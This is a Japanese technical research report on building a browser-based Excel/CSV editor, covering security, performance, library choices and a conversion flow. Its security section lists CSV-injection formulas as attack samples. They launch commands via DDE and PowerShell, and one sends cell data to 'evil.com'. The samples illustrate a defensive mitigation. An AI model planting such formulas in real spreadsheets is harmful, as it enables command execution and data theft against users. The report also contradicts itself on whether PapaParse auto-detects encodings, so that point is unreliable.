# 技術調査レポート

## 概要

Excel/CSVブラウザ編集Webアプリ構築に必要な技術要素の調査結果をまとめる。

---

## 1. セキュリティ分析

### 1.1 CSVインジェクション

CSVファイルのセルが `=`, `+`, `-`, `@`, `\t`, `\r` で始まる場合、Excelで開いた際に数式として実行される可能性がある。

**攻撃例**:
```
=CMD|'/C calc'!A0
=HYPERLINK("http://evil.com/steal?data="&A1, "Click here")
+cmd|'/C powershell -ep bypass ...'!A0
@SUM(1+1)*cmd|'/C calc'!A0
```

**対策**:
- エクスポート時に危険なプレフィックス文字を検出し警告表示
- オプションでシングルクオート(`'`)プレフィックスによるエスケープ
- 検出対象: `=`, `+`, `-`, `@`, `\t`, `\r`, `\n`

### 1.2 XSS (Cross-Site Scripting)

**リスク**: セルデータに`<script>`タグやイベントハンドラが含まれる場合

**対策**:
- React のJSX自動エスケープ機能に依存（`dangerouslySetInnerHTML` 使用禁止）
- UniverはCanvas描画のためDOM XSSリスクは低い
- ファイル名表示等のテキスト出力には必ずReactのテキストノードを使用

### 1.3 CSP (Content Security Policy)

**推奨設定**:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';  # Univerが動的スタイル注入するため必要
  img-src 'self' blob: data:;
  connect-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
```

**`style-src 'unsafe-inline'` に関するセキュリティ上の注意**:

UniverはCanvas描画に伴い動的にstyle要素を注入するため、`unsafe-inline`が必須となる。これはCSPの保護を部分的に弱めるセキュリティ上の譲歩である。

- **リスク**: 攻撃者がスタイル注入可能な脆弱性を発見した場合、CSSを通じたデータ流出（CSS Exfiltration）やUIの偽装が可能になる
- **緩和策**:
  - `script-src`は厳格に`'self'`を維持し、JavaScriptの注入は防止
  - `frame-src 'none'`でiframeによる攻撃を防止
  - ユーザー入力をCSS値として直接使用しない
- **将来計画**: Univerがnonce対応した段階で`'unsafe-inline'`をnonce方式に移行

### 1.4 ファイルバリデーション

| チェック項目 | 方法 | 目的 |
|---|---|---|
| 拡張子 | `.xlsx`, `.xls`, `.csv`, `.ods` のホワイトリスト | 不正ファイル形式の排除 |
| MIMEタイプ | `File.type` チェック（信頼度低） | 簡易チェック |
| マジックバイト | 先頭バイトパターン照合 | ファイル偽装検出 |
| サイズ上限 | デフォルト50MB | メモリ枯渇防止 |

**マジックバイト一覧**:
- `.xlsx`: `50 4B 03 04` (ZIPフォーマット)
- `.xls`: `D0 CF 11 E0` (OLE2 Compound Document)
- `.csv`: テキストファイルのため該当なし（UTF-8 BOM `EF BB BF` の存在チェック）
- `.ods`: `50 4B 03 04` (ZIPフォーマット)

---

## 2. パフォーマンス分析

### 2.1 描画方式: Canvas vs DOM

| 観点 | Canvas (Univer) | DOM (Handsontable等) |
|---|---|---|
| 大規模データ | 仮想化不要、数百万セル対応 | 仮想スクロール必要、10万行が限界 |
| 描画性能 | GPU活用、60fps維持 | DOMリフロー発生、スクロール時カクつき |
| メモリ効率 | セルデータのみ保持 | DOM要素数に比例してメモリ増加 |
| アクセシビリティ | スクリーンリーダー対応が困難 | 標準的なARIA対応可能 |
| テスタビリティ | E2Eテストが複雑 | DOM要素を直接アサート可能 |

**結論**: パフォーマンス優先でCanvas描画（Univer）を採用。アクセシビリティはPhase 2で対応。

### 2.2 Web Worker活用

大容量ファイル（1万行以上）のパース処理をWeb Workerにオフロードすることで、メインスレッドのブロックを防止。

**Worker化対象**:
- SheetJSによるファイルパース処理
- ExcelJSによるファイル生成処理
- PapaParseによるCSVパース/生成

**MVP段階**: メインスレッドで同期処理。Phase 2でWorker化。

### 2.3 日本語CSV文字エンコーディング対応

日本語環境ではShift_JIS/EUC-JPエンコーディングのCSVファイルが広く使われている。

**PapaParseの対応状況**:
- PapaParse自体にはShift_JIS/EUC-JP の自動検出・変換機能はない
- UTF-8およびUTF-8 BOM付きCSVのみネイティブ対応

**対応方針**:
- MVP段階: UTF-8 CSVのみ正式対応。Shift_JIS/EUC-JPファイルは文字化けする旨をエラーメッセージで通知
- Phase 2: `TextDecoder` API + エンコーディング自動判定ライブラリ（`encoding-japanese`等）を導入し、Shift_JIS/EUC-JPの自動検出・変換に対応
- エクスポート時はUTF-8 BOM付きCSVをデフォルトとする（Excel互換のため）

### 2.4 バンドルサイズ

**主要ライブラリのサイズ見積もり**:

| ライブラリ | gzip後サイズ(概算) |
|---|---|
| React + React DOM | ~45KB |
| Univer (sheets-core) | ~500KB ※ |
| SheetJS | ~150KB |
| ExcelJS | ~200KB |
| PapaParse | ~15KB |
| shadcn/ui + Tailwind | ~30KB |

※ Univerのサイズは概算見積もりであり未実測。プラグイン構成によっては700-900KB程度になる可能性がある。実装時にビルド後のバンドルサイズを実測し検証必須。

**合計**: 約940KB (gzip後)

**最適化戦略**:
- Viteの`manualChunks`でベンダー分割
- ExcelJS/SheetJSは動的`import()`で遅延ロード
- Tree shaking有効化

---

## 3. ライブラリ比較

### 3.1 スプレッドシートUIライブラリ

| ライブラリ | ライセンス | 描画方式 | 数式エンジン | メンテ状況 | 商用利用 |
|---|---|---|---|---|---|
| **Univer** | Apache 2.0 | Canvas | 内蔵 | 非常にアクティブ | 無料 |
| FortuneSheet | MIT | Canvas | 内蔵 | アクティブ | 無料 |
| Handsontable | 商用ライセンス | DOM | なし | アクティブ | **有料** |
| x-spreadsheet | MIT | Canvas | 基本的 | 停滞 | 無料 |
| ag-Grid Community | MIT | DOM | なし | アクティブ | 無料(機能限定) |

**選定: Univer**
- Apache 2.0で商用無料
- Canvas描画で高パフォーマンス
- プラグインアーキテクチャで拡張性高い
- Facade APIで疎結合な統合が可能
- アクティブな開発とコミュニティ

### 3.2 Excelパーサー/ライター

| ライブラリ | 読み込み | 書き出し | スタイル対応 | 数式 |
|---|---|---|---|---|
| **SheetJS CE** | xlsx/xls/csv/ods | xlsx/csv | 限定的(CE版) | 読み取りのみ |
| **ExcelJS** | xlsx | xlsx | 豊富 | 設定可能 |
| xlsx-populate | xlsx | xlsx | 中程度 | 設定可能 |

**選定**: 読み込みにSheetJS CE（多形式対応）、書き出しにExcelJS（スタイル対応）の組み合わせ

### 3.3 CSV処理

| ライブラリ | パース速度 | ストリーミング | ブラウザ対応 | 特徴 |
|---|---|---|---|---|
| **PapaParse** | 最速 | ○ | ○ | デファクトスタンダード |
| csv-parse | 高速 | ○ | △(Node.js向け) | Node.jsストリーム対応 |
| d3-dsv | 高速 | × | ○ | D3.jsエコシステム |

**選定: PapaParse** — ブラウザ対応、最速、自動エンコーディング検出

---

## 4. 変換フロー設計

```
[ユーザーファイル (.xlsx/.csv/.xls)]
    ↓ File API (ArrayBuffer)
    ↓ バリデーション (拡張子/サイズ/マジックバイト)
    ↓
[SheetJS XLSX.read()]
    ↓ SheetJS WorkBook
    ↓
[import-adapter]  ← SheetJS WorkBook → Univer IWorkbookData 変換
    ↓
[Univer] で表示・編集
    ↓
[export-adapter]  ← Univer Snapshot → ExcelJS Workbook / PapaParse CSV 変換
    ↓
[Blob生成 → URL.createObjectURL → ダウンロード]
```

### import-adapter 変換マッピング (SheetJS → Univer)

| SheetJS | Univer IWorkbookData | 備考 |
|---|---|---|
| `workbook.SheetNames` | `sheets` キー配列 | シート順序維持 |
| `worksheet['!ref']` | `rowCount`, `columnCount` | セル範囲 |
| `worksheet[cellRef]` | `cellData[row][col]` | セルデータ |
| `cell.v` (値) | `cellData.v` | プリミティブ値 |
| `cell.t` (型) | `cellData.t` | `n`=数値, `s`=文字列, `b`=真偽 |
| `cell.f` (数式) | `cellData.f` | 数式文字列 |
| `cell.s` (スタイル) | `cellData.s` | **MVPではスタイル変換は未対応**（フォント、色、罫線等は無視される）。Phase 2でフォント→罫線→背景色の順に段階的対応予定 |
| `worksheet['!merges']` | `mergeData` | セル結合。SheetJSの `{s:{r,c}, e:{r,c}}` 形式からUniverの `{startRow, startColumn, endRow, endColumn}` 形式に変換 |
| `worksheet['!cols']` | `columnData` | 列幅 |
| `worksheet['!rows']` | `rowData` | 行高 |

---

## 結論

選定した技術スタック（React + Vite + Univer + SheetJS + ExcelJS + PapaParse）は、クライアントサイド完結型のExcel/CSVエディタ構築に最適な組み合わせ。特にUniverのCanvas描画エンジンにより高パフォーマンスを実現しつつ、SheetJS/ExcelJSの組み合わせで幅広いファイル形式に対応可能。
